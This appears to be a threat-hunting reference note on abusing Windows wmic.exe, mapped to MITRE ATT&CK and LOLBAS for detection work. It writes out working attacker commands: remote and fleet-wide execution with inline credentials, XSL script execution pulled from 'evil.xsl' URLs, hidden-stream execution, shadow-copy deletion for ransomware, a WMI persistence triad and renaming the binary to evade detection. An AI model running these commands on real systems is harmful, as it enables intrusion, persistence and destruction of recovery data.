# LOLBins — wmic.exe — Hands-On Use Cases

Every scenario below is verified against the [LOLBAS Project's `Wmic.yml`](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Wmic.yml), Microsoft's [WMIC Win32 reference](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmic), or the specific third-party research cited inline where LOLBAS doesn't document a technique directly (persistence subscription creation). MITRE ATT&CK ID(s) are tagged per scenario. Per `01 - Overview.md`, every `Win32_Process.Create()`-based scenario actually executes inside `WmiPrvSE.exe`, not `wmic.exe` itself.

## Contents
- [Local Process Execution](#local-process-execution)
- [Alternate Data Stream Execution](#alternate-data-stream-execution)
- [Remote Process Execution via /node:](#remote-process-execution-via-node)
- [Fleet-Wide Remote Execution](#fleet-wide-remote-execution)
- [XSL-Transform Remote-URL Execution (SquiblyTwo)](#xsl-transform-remote-url-execution-squiblytwo)
- [XSL-Transform SMB-Sourced Execution](#xsl-transform-smb-sourced-execution)
- [Antivirus / EDR Product Discovery](#antivirus--edr-product-discovery)
- [Installed-Software and Patch Enumeration](#installed-software-and-patch-enumeration)
- [User Account and Local Group Enumeration](#user-account-and-local-group-enumeration)
- [OS / Hardware / Process Enumeration](#os--hardware--process-enumeration)
- [File Copy via datafile Copy](#file-copy-via-datafile-copy)
- [Volume Shadow Copy Deletion](#volume-shadow-copy-deletion)
- [WMI Permanent-Event-Subscription Persistence](#wmi-permanent-event-subscription-persistence)
- [Renamed or Relocated Binary](#renamed-or-relocated-binary)

---

## Local Process Execution

**MITRE ATT&CK:** [T1047](https://attack.mitre.org/techniques/T1047/) (Windows Management Instrumentation), [T1218](https://attack.mitre.org/techniques/T1218/) (System Binary Proxy Execution)

```cmd
wmic.exe process call create "calc.exe"
```

Verified verbatim against LOLBAS's `Local Process Execution` technique (`wmic.exe process call create "{CMD}"`, demonstrated with `calc.exe`). `process` is the built-in alias for `Win32_Process`; `call create` invokes that class's `Create` method with the given command line as its argument. Even with no `/node:` specified, the created process is a child of the local `WmiPrvSE.exe`, not of `wmic.exe` — see `01 - Overview.md`'s How It Works §2.

## Alternate Data Stream Execution

**MITRE ATT&CK:** [T1564.004](https://attack.mitre.org/techniques/T1564/004/) (Hide Artifacts: NTFS File Attributes), T1218

```cmd
wmic.exe process call create "C:\Users\Public\notes.txt:program.exe"
```

Verified verbatim against LOLBAS's `Alternate Data Stream Execution` technique (`wmic.exe process call create "{PATH_ABSOLUTE}:program.exe"`). A payload previously written into an NTFS Alternate Data Stream on an otherwise innocuous file (e.g. via `type payload.exe > notes.txt:program.exe`) is executed directly by path — a default directory listing shows only `notes.txt` at its original (likely small) size, with the executable content invisible unless specifically enumerated (`Get-Item -Stream *` or `dir /r`).

## Remote Process Execution via /node:

**MITRE ATT&CK:** T1047, T1218

```cmd
wmic.exe /node:"10.10.10.5" process call create "cmd.exe /c whoami > C:\Windows\Temp\out.txt"
```

Verified against LOLBAS's `Remote Process Execution` technique (`wmic.exe /node:"192.168.0.1" process call create "{CMD}"`, described as executing `evil.exe` on the remote system). `/node:` redirects the entire command to the named remote host over DCOM/RPC. Because `wmic.exe` has no built-in output-relay mechanism (unlike `wmiexec.py`'s loopback-SMB `__<timestamp>` file — see `01 - Overview.md`), an operator who needs the command's output back typically redirects it to a file on a share both sides can reach, as shown above, then retrieves that file separately (e.g. over the `ADMIN$`/`C$` share).

## Fleet-Wide Remote Execution

**MITRE ATT&CK:** T1047, T1218, [T1570](https://attack.mitre.org/techniques/T1570/) (Lateral Tool Transfer, where the payload itself is staged this way)

```cmd
wmic.exe /node:"10.10.10.5,10.10.10.6,10.10.10.7" /user:"CORP\svc-admin" /password:"P@ssw0rd" process call create "cmd.exe /c C:\Windows\Temp\stage2.exe"
```

`/node:` accepts a comma-delimited list of targets directly (or `/node:@hosts.txt` to read a target list from a file), and `wmic.exe` executes the same command against each one — a native, no-additional-tooling equivalent of scripting `wmiexec.py` in a loop across a target list, useful in the pre-encryption staging phase of a ransomware intrusion or anywhere the same payload needs to run across an already-compromised fleet at once. `/password:` on the command line is fully visible to command-line-auditing/Sysmon 1 logging on the source host — see `03 - Source Evidence.md`.

## XSL-Transform Remote-URL Execution (SquiblyTwo)

**MITRE ATT&CK:** T1218, [T1220](https://attack.mitre.org/techniques/T1220/) (XSL Script Processing)

```cmd
wmic.exe process get brief /format:"https://198.51.100.7/evil.xsl"
```

Verified against LOLBAS's `XSL Remote Execution (URL)` technique (`wmic.exe process get brief /format:"{REMOTEURL:.xsl}"`) — note LOLBAS's own YAML lists a mismatched `Description` field for this exact command ("Create a volume shadow copy of NTDS.dit that can be copied") that has nothing to do with XSL execution, an apparent copy-paste error in the upstream catalog; this note's description instead follows the command's actual documented `Category`/`Usecase`/`Tags` fields (`Execute`, `XSL`, `Remote`) and Casey Smith's original ["WMIC.exe Whitelisting Bypass"](https://subt0x11.blogspot.com/2018/04/wmicexe-whitelisting-bypass-hacking.html) research, which is what named this technique **"SquiblyTwo."** `wmic.exe` fetches the `.xsl` stylesheet from the given URL to format the `process get brief` output; a malicious stylesheet embeds JScript/VBScript in a `<msxsl:script>` block, which the CLR-hosted XSL processor executes as a side effect of "formatting" the query result — a documented AppLocker/application-whitelisting bypass, since `wmic.exe` itself is a signed Microsoft binary and the payload is never written to disk as a standalone executable. This is the technique that produces the `wmic.exe.log` CLR usage-log artifact flagged in `01 - Overview.md`'s red-flag callout.

## XSL-Transform SMB-Sourced Execution

**MITRE ATT&CK:** T1218, T1220

```cmd
wmic.exe process get brief /format:"\\fileserver01\share\evil.xsl"
```

Verified against LOLBAS's `XSL Remote Execution (SMB)` technique (`wmic.exe process get brief /format:"{PATH_SMB:.xsl}"`, described as "Executes JScript or VBScript embedded in the target remote XSL stylsheet"). Functionally identical to the URL variant above, except the stylesheet is pulled from an internal SMB share rather than the Internet — an operator already inside a domain environment can host the malicious `.xsl` on any reachable share and generate **zero outbound HTTP(S) traffic**, defeating a hunt or proxy control keyed purely on web egress, the same evasion logic covered for `bitsadmin.exe`'s SMB-sourced transfer in this module's sibling entry.

## Antivirus / EDR Product Discovery

**MITRE ATT&CK:** [T1518.001](https://attack.mitre.org/techniques/T1518/001/) (Security Software Discovery)

```cmd
wmic.exe /namespace:\\root\SecurityCenter2 path AntiVirusProduct get displayName,productState
```

Verified verbatim against LOLBAS's `Antivirus Discovery` technique. `root\SecurityCenter2` is the WMI namespace the Windows Security Center uses to publish registered AV/firewall/antispyware product state; `productState` is a packed hex value encoding enabled/disabled and up-to-date/out-of-date status per product (decoding the bitmask itself is a separate, well-documented parsing exercise, not part of this command). A near-universal first recon step before deploying a payload the operator expects a specific product to catch.

## Installed-Software and Patch Enumeration

**MITRE ATT&CK:** [T1518](https://attack.mitre.org/techniques/T1518/) (Software Discovery), [T1082](https://attack.mitre.org/techniques/T1082/) (System Information Discovery)

```cmd
wmic.exe qfe get HotFixID,InstalledOn
wmic.exe product get Name,Version
```

`qfe` (Quick Fix Engineering) enumerates installed hotfixes/patches — useful for an operator scoping which known-CVE exploit chains are still viable on a target. `product` enumerates MSI-installed software with name/version — both are standard WMI aliases, not LOLBAS-catalogued abuse techniques specifically, but routine recon commands documented across numerous WMIC reference guides (e.g. [SS64's WMIC reference](https://ss64.com/nt/wmic.html)) and observed operationally in intrusion write-ups. `product get` in particular is known to be slow and to trigger MSI self-repair/validation on some systems — worth noting as an operational (not just forensic) side effect.

## User Account and Local Group Enumeration

**MITRE ATT&CK:** [T1087.001](https://attack.mitre.org/techniques/T1087/001/) (Local Account Discovery), [T1069.001](https://attack.mitre.org/techniques/T1069/001/) (Local Groups Discovery)

```cmd
wmic.exe useraccount get Name,SID,Disabled,Lockout
wmic.exe group get Name,SID
```

`useraccount` surfaces local (and, against a DC, domain) accounts with their SIDs and enabled/lockout state — a richer, more structured alternative to `net user` for the same recon goal. `group` does the equivalent for local groups. Both are unauthenticated-locally / low-privilege recon commands an operator runs early in a foothold to map account and group structure before deciding on privilege-escalation or lateral-movement targets.

## OS / Hardware / Process Enumeration

**MITRE ATT&CK:** T1082 (System Information Discovery), [T1057](https://attack.mitre.org/techniques/T1057/) (Process Discovery)

```cmd
wmic.exe os get Caption,Version,OSArchitecture,BuildNumber
wmic.exe computersystem get Name,Domain,Manufacturer,Model
wmic.exe process list brief
```

Baseline situational-awareness commands — OS version/architecture/build (useful for exploit targeting), domain membership and hardware model (physical vs. virtual, useful for sandbox/VM-detection logic in a payload), and a running-process snapshot. None of these are LOLBAS-catalogued abuse techniques specifically; they're everyday recon commands whose presence in a suspicious command-line/Sysmon 1 stream is itself a useful corroborating signal that an operator is manually enumerating a freshly-landed host.

## File Copy via datafile Copy

**MITRE ATT&CK:** [T1105](https://attack.mitre.org/techniques/T1105/) (Ingress Tool Transfer)

```cmd
wmic.exe datafile where "Name='C:\\windows\\system32\\calc.exe'" call Copy "C:\\users\\public\\calc.exe"
```

Verified verbatim against LOLBAS's `File Copy Operation` technique. `datafile` is the alias for `CIM_DataFile`; `where "Name='...'"` filters to the specific file instance, and `call Copy "<dest>"` invokes that instance's `Copy` method. A WMI-native alternative to `copy`/`xcopy`/`robocopy` for staging a renamed copy of a legitimate system binary (a masquerading precursor step) or moving a payload already on disk into a different location — note the double backslashes are literal, required WQL string-escaping for the `where` clause, not a typo.

## Volume Shadow Copy Deletion

**MITRE ATT&CK:** [T1490](https://attack.mitre.org/techniques/T1490/) (Inhibit System Recovery)

```cmd
wmic.exe shadowcopy delete /nointeractive
```

Not part of LOLBAS's own catalogued command list for this binary, but extensively documented as a real-world procedure example in MITRE ATT&CK's T1047 page and in numerous ransomware detection-rule sets (Splunk, Elastic — see `05 - Detection and Hunting.md`). `shadowcopy` is the alias for `Win32_ShadowCopy`; `delete` removes every shadow copy instance, and `/nointeractive` (WMIC's global `/INTERACTIVE:OFF` switch, invoked here in its shorthand per-command form) suppresses the confirmation prompt `DELETE` verbs normally raise — critical for unattended/scripted ransomware use. Frequently seen paired with `vssadmin delete shadows /all /quiet` in the same batch script as a belt-and-suspenders anti-recovery step, since the two tools implement the deletion through different underlying mechanisms. Confirmed via MITRE's own T1047 description to specifically call out `wmic.exe Shadowcopy Delete` as a named example.

## WMI Permanent-Event-Subscription Persistence

**MITRE ATT&CK:** [T1546.003](https://attack.mitre.org/techniques/T1546/003/) (Event Triggered Execution: WMI Event Subscription)

```cmd
wmic.exe /namespace:"\\root\subscription" path __EventFilter create Name="PentestLab", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"

wmic.exe /namespace:"\\root\subscription" path CommandLineEventConsumer create Name="PentestLab", ExecutablePath="C:\Windows\System32\payload.exe", CommandLineTemplate="C:\Windows\System32\payload.exe"

wmic.exe /namespace:"\\root\subscription" path __FilterToConsumerBinding create Filter="__EventFilter.Name=\"PentestLab\"", Consumer="CommandLineEventConsumer.Name=\"PentestLab\""
```

**This is a fundamentally different technique from every execution use case above it in this file, sharing only the client binary.** Verified against the well-documented triad-creation pattern published by [pentestlab.blog's "Persistence – WMI Event Subscription"](https://pentestlab.blog/2020/01/21/persistence-wmi-event-subscription/) and consistent with LOLBAS's own separately-tracked detection reference for this binary (LOLBAS's `Wmic.yml` Detection section lists a dedicated Sigma rule, [`proc_creation_win_wmic_eventconsumer_creation.yml`](https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_wmic_eventconsumer_creation.yml), even though this exact triad is not one of the 7 numbered `Commands` entries in that YAML). Each `CREATE` verb here is a plain WMI object-creation call against the `root\subscription` namespace — no `Win32_Process.Create()` involved, and critically **no `WmiPrvSE.exe` execution-time child-process signature** the way every scenario above this one produces. The bound triad (filter → consumer → binding) is what actually persists and later executes the `CommandLineTemplate` payload, potentially long after `wmic.exe` itself has exited — full mechanics, the filter/consumer/binding relationship, live-enumeration commands, and the complete Sysmon 19/20/21 / WMI-Activity 5859-5861 event trail are already covered in depth in `Windows/10 - Persistence Mechanisms/WMI Event Consumers.md`, which this note cross-links to rather than re-deriving.

## Renamed or Relocated Binary

**MITRE ATT&CK:** [T1036.003](https://attack.mitre.org/techniques/T1036/003/) (Masquerading: Rename System Utilities), plus whichever WMIC technique it's paired with

```cmd
copy C:\Windows\System32\wbem\wmic.exe C:\Users\Public\svchost_helper.exe
C:\Users\Public\svchost_helper.exe process call create "calc.exe"
```

Not a LOLBAS-documented technique specifically for this binary, but the same general masquerading logic covered for `certutil.exe`/`bitsadmin.exe` elsewhere in this module applies equally here: copying the legitimate signed binary under a different name/path defeats a detection rule keyed purely on `Image` = `wmic.exe` at `System32\wbem`/`SysWOW64\wbem` — LOLBAS's `Full_Path` listing names exactly those two directories as the only legitimate install locations. Authenticode/`OriginalFileName` checks still identify the underlying binary as Microsoft-signed `wmic.exe` even when renamed, and — just as with `bitsadmin.exe` — renaming the client does nothing to change the resulting child process's parent: it's still `WmiPrvSE.exe` regardless of what invoked the WMI call, which is why the process-tree signal in `05 - Detection and Hunting.md` outranks this one.
